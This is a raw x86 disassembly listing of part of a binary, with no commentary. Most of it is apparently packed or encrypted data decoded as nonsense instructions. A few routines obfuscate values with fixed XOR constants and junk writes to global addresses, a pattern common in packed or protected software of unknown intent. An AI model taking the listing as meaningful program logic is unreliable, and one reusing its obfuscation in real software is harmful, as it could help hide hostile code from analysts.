  40a4ac:	stos   DWORD PTR es:[edi],eax
  40a4ad:	adc    bh,ch
  40a4af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a4b0:	adc    al,0xb6
  40a4b3:	in     eax,dx
  40a4b4:	dec    edi
  40a4b5:	lock in eax,0xfa
  40a4b8:	or     DWORD PTR [ebx+eax*1+0x55],esp
  40a4bc:	out    dx,eax
  40a4bd:	add    eax,0x28ce1f56
  40a4c2:	add    ecx,DWORD PTR [ebp+eax*4+0x39]
  40a4c6:	bound  ebx,QWORD PTR [ebx]
  40a4c8:	fdiv   st(5),st
  40a4ca:	xchg   ebx,eax
  40a4cb:	ja     0x40a485
  40a4cd:	sti    
  40a4ce:	push   esp
  40a4cf:	jg     0x40a4c9
  40a4d1:	jmp    0xab0be8b0
  40a4d6:	arpl   WORD PTR [edx-0xb83712c],si
  40a4dc:	outs   dx,BYTE PTR ds:[esi]
  40a4dd:	and    BYTE PTR [ebx-0x12],ch
  40a4e0:	push   ebp
  40a4e1:	nop
  40a4e2:	cdq    
  40a4e3:	sbb    al,0x5a
  40a4e5:	rol    BYTE PTR [edx-0x6a],1
  40a4e8:	ror    BYTE PTR [ebp+0x25],1
  40a4eb:	sub    edx,DWORD PTR [esp+ecx*1-0x71]
  40a4ef:	add    eax,0x59fa4703
  40a4f4:	mov    eax,ds:0xc726e8
  40a4f9:	add    BYTE PTR [ebx+0x44e8b06],cl
  40a4ff:	shrd   eax,ecx,0x2
  40a503:	shr    ecx,0x2
  40a506:	shr    edx,0x1e
  40a509:	xor    ecx,0xe706e27a
  40a50f:	push   ecx
  40a510:	xor    eax,edi
  40a512:	jmp    0x40a8f0
  40a517:	sbb    al,0x3d
  40a519:	jmp    0x40a4ee
  40a51b:	jmp    0x9189:0x511a1c23
  40a522:	jo     0x40a597
  40a524:	sahf   
  40a525:	add    al,0x6a
  40a527:	fsubr  DWORD PTR [ebx]
  40a529:	sbb    BYTE PTR [eax],bl
  40a52b:	sahf   
  40a52c:	adc    bl,BYTE PTR [eax]
  40a52e:	sbb    BYTE PTR [esi+0x43],dl
  40a531:	shr    DWORD PTR [eax],0x6e
  40a534:	mov    edx,0x6656cb63
  40a539:	icebp  
  40a53a:	retf   0x8bd
  40a53d:	das    
  40a53e:	mov    cs,esp
  40a540:	dec    bl
  40a542:	pop    esp
  40a543:	inc    ebx
  40a544:	je     0x40a589
  40a546:	xchg   BYTE PTR [ebx+0x28172751],dh
  40a54c:	adc    DWORD PTR [esi],esp
  40a54e:	sbb    DWORD PTR ds:0xf72ddb31,0xffffff95
  40a555:	sbb    ch,BYTE PTR [edi]
  40a557:	add    al,0x2b
  40a559:	inc    ebx
  40a55a:	and    BYTE PTR [ecx],dh
  40a55c:	(bad)  
  40a55d:	sbb    ebx,DWORD PTR [ebp+0x7ebbca]
  40a563:	jmp    0x9ca:0x86c0ae5b
  40a56a:	mov    ebp,0x7fe6e8b
  40a56f:	es pop esp
  40a571:	add    eax,0xf1ce24bc
  40a576:	mov    bh,BYTE PTR [ebx+eax*4-0x76f09e9f]
  40a57d:	xor    eax,0xa771c233
  40a582:	prefetchnta BYTE PTR [edi+0x1d264886]
  40a589:	jno    0x40a606
  40a58b:	pop    es
  40a58c:	in     al,dx
  40a58d:	retf   0x616a
  40a590:	inc    edx
  40a591:	loope  0x40a5a0
  40a593:	and    BYTE PTR [ebx+0x4e],bh
  40a596:	sub    eax,0x35dea75
  40a59b:	fldcw  WORD PTR [ecx-0x37]
  40a59e:	pause  
  40a5a0:	mov    esp,ebp
  40a5a2:	add    cl,BYTE PTR [esi-0x65]
  40a5a5:	out    0x53,al
  40a5a7:	mov    ah,0xdf
  40a5a9:	fs call 0x4b7ec35a
  40a5af:	xchg   ecx,eax
  40a5b0:	jno    0x40a5ac
  40a5b2:	xor    eax,DWORD PTR [eax]
  40a5b4:	mov    esp,0xcd6e04a1
  40a5b9:	inc    ebx
  40a5ba:	leave  
  40a5bb:	and    ebp,DWORD PTR [ebx+0x3]
  40a5be:	jb     0x40a559
  40a5c0:	or     al,0x79
  40a5c2:	add    bh,BYTE PTR [edi]
  40a5c4:	ins    BYTE PTR es:[edi],dx
  40a5c5:	mov    al,ds:0x8d781c6a
  40a5ca:	jo     0x40a572
  40a5cc:	jmp    0x40a577
  40a5ce:	push   ebp
  40a5cf:	int    0x11
  40a5d1:	jb     0x40a64b
  40a5d3:	push   ecx
  40a5d4:	xor    eax,0xcebaab65
  40a5d9:	mov    bh,0x25
  40a5db:	fs (bad) 
  40a5dd:	outs   dx,BYTE PTR ds:[esi]
  40a5de:	xchg   esp,eax
  40a5df:	aaa    
  40a5e0:	xchg   DWORD PTR [ebp+0x613cc183],ebp
  40a5e6:	sbb    ebx,ebx
  40a5e8:	sub    eax,0x628d6463
  40a5ed:	mov    ah,bl
  40a5ef:	jle    0x40a5b8
  40a5f1:	ds hlt 
  40a5f3:	adc    dh,al
  40a5f5:	test   bh,ch
  40a5f7:	pusha  
  40a5f8:	xchg   ebp,eax
  40a5f9:	xchg   esp,eax
  40a5fa:	stos   BYTE PTR es:[edi],al
  40a5fb:	inc    esi
  40a5fc:	sbb    BYTE PTR [eax+0x2b],0x9d
  40a600:	or     DWORD PTR [ebx-0x16],edi
  40a603:	add    al,0x46
  40a605:	pop    ebp
  40a606:	xchg   ecx,eax
  40a607:	(bad)  
  40a608:	sub    dl,BYTE PTR [esi+0x70908bc1]
  40a60e:	fmul   QWORD PTR [ecx-0x53]
  40a611:	cld    
  40a612:	ins    BYTE PTR es:[edi],dx
  40a613:	and    al,0x4e
  40a615:	ret    0x5fe1
  40a618:	test   DWORD PTR [esi+0x3ce2ee89],0xfb086a4c
  40a622:	jb     0x40a5ce
  40a624:	sub    al,0xc0
  40a626:	out    dx,eax
  40a627:	or     eax,0xc01417e9
  40a62c:	rcl    BYTE PTR [ecx],1
  40a62e:	push   eax
  40a62f:	and    esi,DWORD PTR [edi-0x6b263b59]
  40a635:	sub    eax,0x738deb1
  40a63a:	dec    ecx
  40a63b:	das    
  40a63c:	test   al,0xa9
  40a63e:	(bad)  
  40a640:	cmp    al,0xa3
  40a642:	dec    edi
  40a643:	add    eax,0xd200772f
  40a648:	pusha  
  40a649:	and    BYTE PTR [eax],dl
  40a64b:	aam    0xe4
  40a64d:	mov    DWORD PTR [edx+esi*1],esp
  40a650:	aam    0xf
  40a652:	lods   eax,DWORD PTR ds:[si]
  40a654:	xor    edi,edx
  40a656:	pop    ecx
  40a657:	outs   dx,BYTE PTR ds:[esi]
  40a658:	xchg   esi,eax
  40a659:	push   ds
  40a65a:	scas   eax,DWORD PTR es:[edi]
  40a65b:	pop    edx
  40a65c:	pop    es
  40a65d:	push   0x37
  40a65f:	sbb    al,0xad
  40a661:	in     eax,dx
  40a662:	adc    eax,DWORD PTR ds:0x3e88fe6b
  40a668:	jb     0x40a66a
  40a66a:	fcom   QWORD PTR [ebx-0x749a5aec]
  40a670:	mov    dh,0x6e
  40a672:	fincstp 
  40a674:	push   ss
  40a675:	add    DWORD PTR ds:0x2636709d,eax
  40a67b:	in     al,0x8a
  40a67d:	aad    0xae
  40a67f:	mov    ds:0x4de5d539,al
  40a684:	frstor [ecx+0x2e95bc58]
  40a68a:	pop    edi
  40a68b:	fs pop ds
  40a68d:	daa    
  40a68e:	js     0x40a6de
  40a690:	and    BYTE PTR [esi+0x3d941175],dl
  40a696:	ret    
  40a697:	dec    ebx
  40a698:	shl    DWORD PTR [eax+0x3fe76d5d],cl
  40a69e:	cmp    cl,bh
  40a6a0:	rcr    BYTE PTR [esi+0x46212a71],1
  40a6a6:	jb     0x40a725
  40a6a8:	cli    
  40a6a9:	out    dx,al
  40a6aa:	fwait
  40a6ab:	ins    BYTE PTR es:[edi],dx
  40a6ac:	js     0x40a691
  40a6ae:	mov    WORD PTR [ecx-0x67],?
  40a6b1:	or     eax,0x5b124eed
  40a6b6:	repnz mov ah,0x1e
  40a6b9:	ret    0xe873
  40a6bc:	push   edi
  40a6bd:	shl    ecx,1
  40a6bf:	rol    BYTE PTR [eax],cl
  40a6c1:	push   0x70
  40a6c3:	nop
  40a6c4:	mov    esp,0x3e1a62fd
  40a6c9:	sbb    ch,dl
  40a6cb:	test   BYTE PTR [ebp+0x40],0x9e
  40a6cf:	sbb    DWORD PTR [eax+0x629f9fd6],0x65
  40a6d6:	mov    ch,0x55
  40a6d8:	jg     0x40a661
  40a6da:	cld    
  40a6db:	test   DWORD PTR [eax],ecx
  40a6dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a6de:	adc    DWORD PTR [esi-0x55],edx
  40a6e1:	aam    0x33
  40a6e3:	fmul   DWORD PTR [eax+ebx*1+0x556233c5]
  40a6ea:	arpl   WORD PTR [eax+0xd],sp
  40a6ed:	jl     0x40a6a9
  40a6ef:	mov    ds:0x928484d8,eax
  40a6f4:	cmp    DWORD PTR [ecx],edx
  40a6f6:	cmc    
  40a6f7:	lods   al,BYTE PTR ds:[esi]
  40a6f9:	xchg   edx,eax
  40a6fa:	xchg   esp,eax
  40a6fb:	pop    ds
  40a6fc:	cwde   
  40a6fd:	or     ebp,DWORD PTR [eiz*8-0x4e569713]
  40a704:	out    0x4d,eax
  40a706:	xor    ecx,esp
  40a708:	stc    
  40a709:	test   eax,0x2fbf4d19
  40a70e:	inc    esi
  40a70f:	jmp    0xbc53c531
  40a714:	mov    eax,ds:0x9bff20b
  40a719:	dec    esp
  40a71a:	mov    dh,0x15
  40a71c:	xor    DWORD PTR [eiz*4-0x1a8c7467],0x69
  40a724:	test   ax,0xc252
  40a728:	test   eax,0xd475e90b
  40a72d:	jl     0x40a795
  40a72f:	ins    DWORD PTR es:[di],dx
  40a731:	mov    WORD PTR [eax+0x59],bx
  40a735:	dec    ebp
  40a736:	push   ds
  40a737:	hlt    
  40a738:	cdq    
  40a739:	mov    es,WORD PTR [ebp-0x41]
  40a73c:	and    eax,0x33f17ea
  40a741:	adc    al,0x3f
  40a743:	and    BYTE PTR [eax-0x7],cl
  40a746:	xchg   DWORD PTR [edx],edi
  40a748:	stos   DWORD PTR es:[edi],eax
  40a749:	and    bh,cl
  40a74b:	aam    0x9d
  40a74d:	jo     0x40a7ba
  40a74f:	pushf  
  40a750:	stos   BYTE PTR es:[edi],al
  40a751:	lds    edx,FWORD PTR [ecx]
  40a753:	cdq    
  40a754:	sub    eax,0x3b1cc6e3
  40a759:	leave  
  40a75a:	cwde   
  40a75b:	dec    ebp
  40a75c:	mov    al,ds:0xe09db6b1
  40a761:	cdq    
  40a762:	push   0x784b1f7d
  40a767:	and    DWORD PTR [ebx+ebp*4-0x1e],esp
  40a76b:	jmp    0x296bf916
  40a770:	mov    esp,0xff8a6e58
  40a775:	jns    0x40a79e
  40a777:	cmp    bl,BYTE PTR [ebx]
  40a779:	imul   ebx,DWORD PTR [esi+0x52],0x2d7ce61
  40a780:	cwde   
  40a781:	sub    al,0x4d
  40a783:	pop    ds
  40a784:	xchg   ebp,eax
  40a785:	or     ah,bh
  40a787:	aad    0x4d
  40a789:	sub    eax,0x9cc625b5
  40a78e:	loop   0x40a798
  40a790:	and    dh,dh
  40a792:	sub    eax,0xd07aef24
  40a797:	outs   dx,DWORD PTR ds:[esi]
  40a798:	ins    DWORD PTR es:[edi],dx
  40a799:	retf   
  40a79a:	xchg   DWORD PTR [esi+0x5c20975b],esp
  40a7a0:	gs test al,0x4b
  40a7a3:	jp     0x40a78d
  40a7a5:	dec    edx
  40a7a6:	aad    0x6d
  40a7a8:	shl    DWORD PTR [esi+0x21],cl
  40a7ab:	pop    ebx
  40a7ac:	jmp    0xe26d685e
  40a7b1:	push   ebp
  40a7b2:	add    DWORD PTR [ecx-0x46e25a60],esp
  40a7b8:	xchg   BYTE PTR [ebp-0x1a],al
  40a7bb:	or     bl,BYTE PTR [edi-0x15]
  40a7be:	scas   eax,DWORD PTR es:[edi]
  40a7bf:	xor    dh,BYTE PTR [esi-0x5dac398a]
  40a7c5:	push   ecx
  40a7c6:	mov    esi,0xb3505fc2
  40a7cb:	fdivp  st(6),st
  40a7cd:	xchg   ecx,eax
  40a7ce:	jb     0x40a78b
  40a7d0:	fstp   DWORD PTR [eax-0x1bce3de1]
  40a7d6:	add    DWORD PTR [edx-0x74],ecx
  40a7d9:	or     BYTE PTR [eax+0x74592e3d],cl
  40a7df:	dec    ebx
  40a7e0:	dec    ecx
  40a7e1:	adc    edi,DWORD PTR [ebx+0x7e11b267]
  40a7e7:	sub    DWORD PTR [eax+0x73456522],eax
  40a7ed:	pop    esp
  40a7ee:	ins    BYTE PTR es:[edi],dx
  40a7ef:	jl     0x40a780
  40a7f1:	out    0x3c,eax
  40a7f3:	(bad)  
  40a7f4:	ficom  DWORD PTR [eax]
  40a7f6:	shl    BYTE PTR [ebp-0x6c],1
  40a7f9:	gs iret 
  40a7fb:	xor    DWORD PTR [ebp+0x5cfdedde],0xffffff86
  40a802:	fmul   DWORD PTR [ebx+0x4728b884]
  40a808:	je     0x40a82f
  40a80a:	push   cs
  40a80b:	ficomp WORD PTR [eax]
  40a80d:	push   ss
  40a80e:	jecxz  0x40a845
  40a810:	mov    ds:0xa52396b0,al
  40a815:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a816:	mov    al,ds:0x2534bdcf
  40a81b:	shl    DWORD PTR [edi],0x66
  40a81e:	or     dl,dl
  40a820:	jne    0x40a7f9
  40a822:	out    dx,eax
  40a823:	push   ss
  40a824:	xor    edi,DWORD PTR [esi-0x6a]
  40a827:	into   
  40a828:	nop
  40a829:	sbb    eax,DWORD PTR [esi]
  40a82b:	pop    ecx
  40a82c:	sub    ch,BYTE PTR [edx+0x6c4b2ee7]
  40a832:	mov    ebx,0x28d59d4c
  40a837:	pop    esp
  40a838:	pop    ss
  40a839:	xchg   edx,eax
  40a83a:	dec    ebx
  40a83b:	(bad)  
  40a83c:	pop    ebp
  40a83d:	mov    cl,0xb6
  40a83f:	test   BYTE PTR [ebx-0x752d6647],al
  40a845:	ja     0x40a893
  40a847:	add    ebp,edx
  40a849:	jecxz  0x40a8bf
  40a84b:	in     al,0xe9
  40a84d:	jle    0x40a892
  40a84f:	es retf 0x933b
  40a853:	retf   0xd8f2
  40a856:	out    0x31,al
  40a858:	in     eax,dx
  40a859:	pop    ebx
  40a85a:	retf   
  40a85b:	mov    eax,ds:0x3f979d61
  40a860:	lods   al,BYTE PTR ds:[esi]
  40a861:	mov    DWORD PTR [esi-0x68228898],ebp
  40a867:	push   es
  40a868:	sahf   
  40a869:	mov    bh,0x2
  40a86b:	xor    ch,BYTE PTR [eax-0x3d]
  40a86e:	add    ecx,0x764207c0
  40a874:	icebp  
  40a875:	scas   al,BYTE PTR es:[edi]
  40a876:	cmp    ebp,DWORD PTR [ecx-0x5a8f6471]
  40a87c:	sbb    eax,0x9e6a3c0b
  40a881:	fidiv  WORD PTR [ebp+0x2a]
  40a884:	jl     0x40a845
  40a886:	popa   
  40a887:	loop   0x40a838
  40a889:	jge    0x40a8b5
  40a88b:	pop    eax
  40a88c:	cdq    
  40a88d:	adc    al,0x32
  40a88f:	aas    
  40a890:	stc    
  40a891:	cld    
  40a892:	les    esp,FWORD PTR [esi+0x4fd64e38]
  40a898:	add    ebp,ebx
  40a89a:	add    ebp,DWORD PTR [ecx+0x6cf428f]
  40a8a0:	jg     0x40a842
  40a8a2:	inc    BYTE PTR [esi]
  40a8a4:	dec    edx
  40a8a5:	xchg   ebp,eax
  40a8a6:	int3   
  40a8a7:	pop    es
  40a8a8:	dec    esp
  40a8a9:	cdq    
  40a8aa:	and    edi,ebx
  40a8ac:	dec    ecx
  40a8ad:	and    edx,DWORD PTR [ebx+0x73c8d84d]
  40a8b3:	nop
  40a8b4:	mov    esp,0x815e5873
  40a8b9:	push   esi
  40a8ba:	push   ds
  40a8bb:	fucomp st(7)
  40a8bd:	mov    ebx,0xf5ffd220
  40a8c2:	cld    
  40a8c3:	or     DWORD PTR [ebp-0x132013b8],ecx
  40a8c9:	xor    eax,0xfa48348b
  40a8ce:	int3   
  40a8cf:	dec    BYTE PTR [ebx]
  40a8d1:	adc    eax,ecx
  40a8d3:	and    edi,esp
  40a8d5:	test   BYTE PTR [eax+0x7d10da34],ah
  40a8db:	cmp    cl,BYTE PTR ds:0x46feb1bb
  40a8e1:	jg     0x40a8b4
  40a8e3:	mov    ebx,DWORD PTR [ecx]
  40a8e5:	(bad)  
  40a8e6:	lea    ecx,[eax-0x233ff5d2]
  40a8ec:	and    ah,cl
  40a8ee:	jl     0x40a912
  40a8f0:	mov    DWORD PTR [ebp+0x10],edx
  40a8f3:	mov    edx,DWORD PTR [ebx]
  40a8f5:	mov    edi,DWORD PTR [ebx+0x4]
  40a8f8:	push   eax
  40a8f9:	push   edi
  40a8fa:	push   edx
  40a8fb:	call   0x416c20
  40a900:	shld   edx,eax,0x2
  40a904:	shl    eax,0x2
  40a907:	mov    ecx,eax
  40a909:	or     ecx,DWORD PTR [ebp+0x10]
  40a90c:	xor    eax,eax
  40a90e:	or     edx,eax
  40a910:	xor    ecx,0xca79a575
  40a916:	xor    edx,0x9c1b89e8
  40a91c:	mov    DWORD PTR [esi],ecx
  40a91e:	mov    DWORD PTR [esi+0x4],edx
  40a921:	mov    eax,0x40000000
  40a926:	mov    edx,DWORD PTR [ebx]
  40a928:	mov    ecx,DWORD PTR [ebx+0x4]
  40a92b:	xor    edx,0xca79a577
  40a931:	xor    ecx,0x9c1b89e8
  40a937:	shrd   edx,ecx,0x2
  40a93b:	shr    ecx,0x2
  40a93e:	mov    DWORD PTR [ebp-0x6c],ecx
  40a941:	mov    ecx,DWORD PTR [ebx]
  40a943:	mov    edi,DWORD PTR [ebx+0x4]
  40a946:	mov    edi,ecx
  40a948:	xor    ecx,ecx
  40a94a:	or     ecx,edx
  40a94c:	mov    DWORD PTR [ebp+0x8],ecx
  40a94f:	mov    ecx,DWORD PTR [esi]
  40a951:	mov    edx,DWORD PTR [esi+0x4]
  40a954:	xor    edx,0x9c1b89e8
  40a95a:	xor    ecx,0xca79a577
  40a960:	shl    edi,0x1e
  40a963:	mov    DWORD PTR [ebp+0x14],ecx
  40a966:	mov    ecx,edx
  40a968:	mov    edx,DWORD PTR [ebp+0x14]
  40a96b:	shrd   edx,ecx,0x2
  40a96f:	xor    edi,eax
  40a971:	or     edi,DWORD PTR [ebp-0x6c]
  40a974:	mov    DWORD PTR [ebp-0x70],edx
  40a977:	mov    edx,DWORD PTR [esi]
  40a979:	mov    DWORD PTR [ebp+0xc],edi
  40a97c:	mov    edi,DWORD PTR [esi+0x4]
  40a97f:	shl    edx,0x1e
  40a982:	xor    edi,edi
  40a984:	or     edi,DWORD PTR [ebp-0x70]
  40a987:	shr    ecx,0x2
  40a98a:	xor    edx,eax
  40a98c:	or     edx,ecx
  40a98e:	cmp    edi,DWORD PTR [ebp+0x8]
  40a991:	jne    0x40a9a0
  40a997:	cmp    edx,DWORD PTR [ebp+0xc]
  40a99a:	je     0x40a9b0
  40a9a0:	push   DWORD PTR [ebp+0x20]
  40a9a3:	push   DWORD PTR [ebp+0x1c]
  40a9a6:	push   DWORD PTR [ebp+0x18]
  40a9a9:	push   ebx
  40a9aa:	push   esi
  40a9ab:	call   0x414dd5
  40a9b0:	pop    edi
  40a9b1:	leave  
  40a9b2:	ret    0x1c
  40a9b5:	cmp    cl,0x40
  40a9b8:	mov    DWORD PTR ds:0x428313,0x3afd
  40a9c2:	jae    0x40aa0b
  40a9c8:	mov    DWORD PTR ds:0x428307,0x7b96
  40a9d2:	cmp    cl,0x20
  40a9d5:	mov    DWORD PTR ds:0x428263,0x3ad8
  40a9df:	jae    0x40a9fb
  40a9e5:	mov    DWORD PTR ds:0x42830b,0x760a
  40a9ef:	shrd   eax,edx,cl
  40a9f2:	not    DWORD PTR ds:0x428293
  40a9f8:	shr    edx,cl
  40a9fa:	ret    
  40a9fb:	add    DWORD PTR ds:0x428287,ecx
  40aa01:	mov    eax,edx
  40aa03:	xor    edx,edx
  40aa05:	and    cl,0x1f
  40aa08:	shr    eax,cl
  40aa0a:	ret    
  40aa0b:	xor    eax,eax
  40aa0d:	xor    edx,edx
  40aa0f:	ret    
  40aa10:	push   ebp
  40aa11:	mov    ebp,esp
  40aa13:	sub    esp,0x30
  40aa16:	mov    DWORD PTR [ebp-0x18],0xca79a575
  40aa1d:	xor    ecx,ecx
  40aa1f:	mov    eax,0x9c1b89e8
  40aa24:	mov    DWORD PTR [ebp-0x14],eax
  40aa27:	not    ecx
  40aa29:	mov    DWORD PTR [ebp-0x30],0xca79a571
  40aa30:	dec    DWORD PTR ds:0x428303
  40aa36:	mov    DWORD PTR [ebp-0x2c],eax
  40aa39:	mov    DWORD PTR [ebp-0x28],0xae8f94a8
  40aa40:	mov    ecx,DWORD PTR ds:0x42823b
  40aa46:	sbb    DWORD PTR ds:0x42817b,ecx
  40aa4c:	mov    DWORD PTR [ebp-0x24],0x29bd2
  40aa53:	jmp    0x40ae49
  40aa58:	clc    
  40aa59:	sub    dh,BYTE PTR [edx+0x306b2a6b]
  40aa5f:	sub    bh,BYTE PTR ds:0x467e1f6a
  40aa65:	rol    cl,0xb0
  40aa68:	pop    edi
  40aa69:	and    ebx,DWORD PTR [eax]
  40aa6b:	sbb    BYTE PTR [esi+0x12],ch
  40aa6e:	sbb    BYTE PTR [eax],bl
  40aa70:	or     BYTE PTR [edi-0x4f0ace50],bh
  40aa76:	ret    0xc02c
  40aa79:	mov    bl,0x3e
  40aa7b:	add    BYTE PTR [esi+0x2ae219c],0xe4
  40aa82:	jp     0x40aa26
  40aa84:	push   esi
  40aa85:	adc    eax,0xd888911b
  40aa8a:	sahf   
  40aa8b:	jne    0x40aa73
  40aa8d:	std    
  40aa8e:	aad    0xb7
  40aa90:	mov    edi,0xe0d8018e
  40aa95:	adc    ebp,DWORD PTR ds:0xec89bbe2
  40aa9b:	jmp    0x48ab038a
  40aaa0:	push   eax
  40aaa1:	das    
  40aaa2:	pusha  
  40aaa3:	call   0x318c:0x9cd34790
  40aaaa:	xchg   edi,eax
  40aaab:	mov    WORD PTR [ecx+0x314c2894],?
  40aab1:	(bad)  
  40aab2:	fist   DWORD PTR [ebp+0x58308cb7]
  40aab8:	iret   
  40aab9:	es retf 0xc628
  40aabd:	and    DWORD PTR [edx],ecx
  40aabf:	jno    0x40aa46
  40aac1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aac2:	jb     0x40aaf7
  40aac4:	pop    ebp
  40aac5:	mov    ebx,0x3aa090e0
  40aaca:	push   cs
  40aacb:	dec    esi
  40aacc:	dec    ebx
  40aacd:	test   DWORD PTR [esi],eax
  40aacf:	movntq (bad),mm1
  40aad0:	out    0xcf,eax
  40aad2:	jno    0x40aa77
  40aad4:	sbb    cl,dh
  40aad6:	clc    
  40aad7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aad8:	mul    BYTE PTR [ebx]
  40aada:	jbe    0x40aaf4
  40aadc:	inc    eax
  40aadd:	ins    BYTE PTR es:[edi],dx
  40aade:	shr    DWORD PTR [eax],cl
  40aae0:	aam    0xe9
  40aae2:	loope  0x40aaba
  40aae4:	imul   ebx,edi,0x674dff2c
  40aaea:	add    BYTE PTR [ebx],bl
  40aaec:	push   ecx
  40aaed:	outs   dx,DWORD PTR ds:[esi]
  40aaee:	pop    ds
  40aaef:	adc    ecx,DWORD PTR [edi+0xabebe2]
  40aaf5:	dec    eax
  40aaf6:	retf   0x8f0
  40aaf9:	ror    BYTE PTR [eax],cl
  40aafb:	iret   
  40aafc:	xchg   ebp,eax
  40aafd:	adc    DWORD PTR [eax+0x12cadebb],esp
  40ab03:	adc    al,0x3f
  40ab05:	or     BYTE PTR [edx-0x5d8b9224],0x4a
  40ab0c:	iret   
  40ab0d:	pusha  
  40ab0e:	pop    ss
  40ab0f:	ror    DWORD PTR [edx],cl
  40ab11:	aas    
  40ab12:	es out dx,al
  40ab14:	imul   eax,DWORD PTR [esi],0xffffffb9
  40ab17:	or     al,0x61
  40ab19:	les    esp,FWORD PTR ds:0xecdece4c
  40ab1f:	pusha  
  40ab20:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ab21:	fisttp QWORD PTR [edi]
  40ab23:	call   0xddd3:0xfdced9e4
  40ab2a:	cmc    
  40ab2b:	les    ebp,FWORD PTR [edx]
  40ab2d:	dec    ebx
  40ab2e:	mov    ds:0x5821849f,al
  40ab33:	cmc    
  40ab34:	ss dec ebp
  40ab36:	sbb    eax,ebp
  40ab38:	cwde   
  40ab39:	out    dx,al
  40ab3a:	ds jo  0x40ab98
  40ab3d:	fcmove st,st(2)
  40ab3f:	or     eax,ecx
  40ab41:	cmc    
  40ab42:	or     DWORD PTR [ecx+0x14f8f72b],edx
  40ab48:	fwait
  40ab49:	imul   ecx,DWORD PTR [ebp-0x18362a33],0x2f
  40ab50:	push   ds
  40ab51:	imul   DWORD PTR [ebx-0x48d7d7fc]
  40ab57:	sti    
  40ab58:	lock into 
  40ab5a:	scas   al,BYTE PTR es:[edi]
  40ab5b:	mov    edi,0xcba71974
  40ab60:	outs   dx,DWORD PTR ds:[esi]
  40ab61:	pop    ebp
  40ab62:	adc    ebp,DWORD PTR [edi+esi*8+0x36]
  40ab66:	aad    0x17
  40ab68:	adc    ch,cl
  40ab6a:	add    eax,0x4da20b29
  40ab6f:	pop    ebp
  40ab70:	cdq    
  40ab71:	sub    eax,0x82adbc05
  40ab76:	mov    eax,0xe0d57648
  40ab7b:	lods   al,BYTE PTR ds:[esi]
  40ab7c:	mov    eax,0xd49112b0
  40ab81:	mov    edi,0xa0661f51
  40ab86:	into   
  40ab87:	aam    0x95
  40ab89:	(bad)  
  40ab8a:	repnz and DWORD PTR [edx-0x29],0xffffff91
  40ab8f:	(bad)  
  40ab90:	jg     0x40ab29
  40ab92:	pusha  
  40ab93:	jnp    0x40ab23
  40ab95:	out    dx,al
  40ab96:	mov    BYTE PTR [esi-0x60],al
  40ab99:	into   
  40ab9a:	jmp    0xca41:0x6e533f9c
  40aba1:	adc    eax,0x8ee729be
  40aba6:	stc    
  40aba7:	int3   
  40aba8:	std    
  40aba9:	push   eax
  40abaa:	je     0x40ac17
  40abac:	cld    
  40abad:	inc    esp
  40abae:	xchg   esp,eax
  40abaf:	(bad)  
  40abb0:	retf   
  40abb1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40abb2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40abb3:	fcom   QWORD PTR [ebx]
  40abb5:	fimul  DWORD PTR [ecx]
  40abb7:	mov    esp,0x21843a52
  40abbc:	pop    edx
  40abbd:	dec    esp
  40abbe:	ret    
  40abbf:	neg    DWORD PTR [ebp+eiz*8+0x3e]
  40abc3:	test   al,0x33
  40abc5:	adc    al,0xf
  40abc7:	add    cl,BYTE PTR [edi+0x32]
  40abca:	dec    edi
  40abcb:	pop    ebp
  40abcc:	mov    dh,0x19
  40abce:	arpl   WORD PTR [eax-0x62],sp
  40abd1:	jnp    0x40ab99
  40abd3:	add    edx,edi
  40abd5:	in     al,0x16
  40abd7:	int3   
  40abd8:	out    dx,eax
  40abd9:	ja     0x40ab82
  40abdb:	into   
  40abdc:	call   0x88ac:0xf4dcb5a5
  40abe3:	in     eax,0x8f
  40abe5:	ss xchg ebp,eax
  40abe7:	mov    WORD PTR gs:[esi-0x3c7e44a9],fs
  40abee:	ins    DWORD PTR es:[edi],dx
  40abef:	(bad)  
  40abf0:	imul   esp,DWORD PTR [ecx],0x6c
  40abf3:	jecxz  0x40abcb
  40abf5:	jmp    0xd6cd6775
  40abfa:	lahf   
  40abfb:	cmp    BYTE PTR ds:0xadbe8de8,cl
  40ac01:	xchg   BYTE PTR [edi+0x4838bb02],cl
  40ac07:	out    dx,eax
  40ac08:	popa   
  40ac09:	pushf  
  40ac0a:	sahf   
  40ac0b:	out    dx,eax
  40ac0c:	mov    esp,0xb38d516b
  40ac11:	mov    al,0x92
  40ac13:	adc    BYTE PTR [ecx-0x18d8d42c],dl
  40ac19:	cmc    
  40ac1a:	and    ah,BYTE PTR [eax]
  40ac1c:	sbb    dh,BYTE PTR [ebx-0x7d63c287]
  40ac22:	dec    ebp
  40ac23:	xor    eax,0x1213d2cb
  40ac28:	(bad)  
  40ac29:	loope  0x40ac71
  40ac2b:	mov    al,0x5c
  40ac2d:	xchg   ebx,eax
  40ac2e:	les    ecx,FWORD PTR [eax]
  40ac30:	gs jmp 0x23ff31d1
  40ac36:	jae    0x40abd9
  40ac38:	icebp  
  40ac39:	or     al,BYTE PTR [edi]
  40ac3b:	inc    ecx
  40ac3c:	retf   
  40ac3d:	fmul   QWORD PTR [ebx+0x35706c37]
  40ac43:	fld    QWORD PTR [esp+ebx*4+0x74860b9c]
  40ac4a:	fwait
  40ac4b:	xchg   BYTE PTR [ecx-0x45b6ee94],dl
  40ac51:	cmp    ecx,DWORD PTR ds:0x62629b5
  40ac57:	push   ebx
  40ac58:	mov    bh,0x20
  40ac5a:	out    0x19,eax
  40ac5c:	inc    esp
  40ac5d:	scas   al,BYTE PTR es:[edi]
  40ac5e:	jnp    0x40ac2b
  40ac60:	stos   DWORD PTR es:[edi],eax
  40ac61:	and    al,0x8c
  40ac63:	push   cs
  40ac64:	cmp    eax,0x2138925e
  40ac69:	dec    ecx
  40ac6a:	mov    dh,BYTE PTR [ebx]
  40ac6c:	sub    ch,BYTE PTR [ebp+0x16]
  40ac6f:	mov    eax,0x135dc410
  40ac74:	aaa    
  40ac75:	fld    TBYTE PTR [eax]
  40ac77:	adc    bh,BYTE PTR [edi+0x37]
  40ac7a:	dec    ebp
  40ac7b:	js     0x40aced
  40ac7d:	push   esp
